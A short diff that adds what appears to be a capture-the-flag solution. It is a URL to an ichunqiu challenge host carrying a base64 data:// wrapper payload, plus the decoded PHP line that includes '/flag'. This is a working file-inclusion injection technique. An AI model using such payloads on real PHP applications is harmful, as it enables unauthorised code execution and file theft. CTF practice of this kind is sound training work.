@@ -1,0 +1,3 @@
+http://eci-2ze40zr0srdj3ts2cctb.cloudeci1.ichunqiu.com/?iknow=1&me=data://text/plain;base64,PD9waHAgaW5jbHVkZSIvZmxhZyI7Pz4
+
+<?php include"/flag";?>
